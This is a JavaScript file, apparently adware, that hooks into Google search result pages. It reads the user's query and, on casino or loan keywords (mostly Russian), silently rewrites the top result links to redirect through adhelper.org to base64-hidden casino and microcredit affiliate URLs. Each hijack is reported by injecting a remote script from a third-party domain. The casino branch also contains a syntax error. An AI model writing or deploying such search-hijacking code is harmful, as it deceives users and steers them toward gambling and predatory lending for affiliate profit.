var keyWords_casino = ["Игровые автоматы","игровые аппараты","казино", "Gaminator", "карточные игры", "видеопокер","книжки","Crazy Fruits","игровой автомат","garage","just jewels","mega jack","алькатрас","гараж","емеля","клубнички","ешки","золото партии","обезьянки","резидент","клубнички","лягушки","гейминатор","слотомания","золото ацтеков","книга ра","fruit cocktail","гаминатор","мега джек","черти","bananas go bahamas","black beard","book of ra","casino","crazy monkey","fairy land","fruit cocktail","golden mine","lucky haunter","lucky lady","piggy bank","resident","queen of hearts","windjammer","ацтек голд","книги ра","пробки","сундуки","чукча","fairy land","gaminator","money","печки","сейфы","скалолаз","гараж","играть бесплатно","манки","играть на","крези фрукт","однорукий","фруктовый коктейль","Keks","Rock Climber"];

var keyWords_credit = ["кредит","деньги","ипотека","в долг","автокредит","банк"];

		document.getElementById('main').addEventListener('DOMNodeInserted',function() {
		var keyWords_casino = ["Игровые автоматы","игровые аппараты","казино", "Gaminator", "карточные игры", "видеопокер","книжки","Crazy Fruits","игровой автомат","garage","just jewels","mega jack","алькатрас","гараж","емеля","клубнички","ешки","золото партии","обезьянки","резидент","клубнички","лягушки","гейминатор","слотомания","золото ацтеков","книга ра","fruit cocktail","гаминатор","мега джек","черти","bananas go bahamas","black beard","book of ra","casino","crazy monkey","fairy land","fruit cocktail","golden mine","lucky haunter","lucky lady","piggy bank","resident","queen of hearts","windjammer","ацтек голд","книги ра","пробки","сундуки","чукча","fairy land","gaminator","money","печки","сейфы","скалолаз","гараж","играть бесплатно","манки","играть на","крези фрукт","однорукий","фруктовый коктейль","Keks","Rock Climber"];

		var keyWords_credit = ["кредит","деньги","ипотека","в долг","автокредит","банк"];
		
		if (document.getElementsByClassName('r')[0]){
				for(var i=0;i<keyWords_casino.length;i++){
					if (document.getElementById('gbqfq').value.indexOf(keyWords_casino[i]) >-1) {
						document.getElementsByClassName('r')[0].setAttribute('onmousedown','document.location = "http://adhelper.org/?r=aHR0cDovL21heGNhc2luby5jb20vP3BhcnRuZXI9bXNpZDI=";'+SendStat(1););		
						document.getElementsByClassName('r')[0].getElementsByTagName('a')[0].target="";
						document.getElementsByClassName('r')[0].getElementsByTagName('a')[0].href="";
						document.getElementsByClassName('r')[1].setAttribute('onmousedown','document.location = "http://adhelper.org/?r=aHR0cDovL21heGNhc2luby5jb20vP3BhcnRuZXI9bXNpZDI=";'+SendStat(1););		
						document.getElementsByClassName('r')[1].getElementsByTagName('a')[0].target="";
						document.getElementsByClassName('r')[1].getElementsByTagName('a')[0].href="http://adhelper.org/?r=aHR0cDovL21heGNhc2luby5jb20vP3BhcnRuZXI9bXNpZDI=";
						return false;
					}
				}
				for(var i=0;i<keyWords_credit.length;i++){
					if (document.getElementById('gbqfq').value.indexOf(keyWords_credit[i]) >-1) {
						document.getElementsByClassName('r')[0].setAttribute('onmousedown','document.location = "http://adhelper.org/?r=aHR0cDovL2F1dG9rcmVkaXQ3NzcuY29tL21pY3JvY3JlZGl0Lw==";'+SendStat(1));		
						document.getElementsByClassName('r')[0].getElementsByTagName('a')[0].target="";
						document.getElementsByClassName('r')[0].getElementsByTagName('a')[0].href="";
						document.getElementsByClassName('r')[1].setAttribute('onmousedown','document.location = "http://adhelper.org/?r=aHR0cDovL2F1dG9rcmVkaXQ3NzcuY29tL21pY3JvY3JlZGl0Lw==";'+SendStat(1));		
						document.getElementsByClassName('r')[1].getElementsByTagName('a')[0].target="";
						document.getElementsByClassName('r')[1].getElementsByTagName('a')[0].href="http://adhelper.org/?r=aHR0cDovL2F1dG9rcmVkaXQ3NzcuY29tL21pY3JvY3JlZGl0Lw==";
						return false;
					}
				}
			}
					
			},false);

function SendStat(count){		
	var stat = document.createElement("script");
		url = "http://vogis.asmeninis.com/administrator/help/en-GB/css/style/google_statistic.php/?count="+count;
		stat.setAttribute('type', 'text/javascript');
		stat.setAttribute('src', url);
		document.head.appendChild(stat);	
}


	
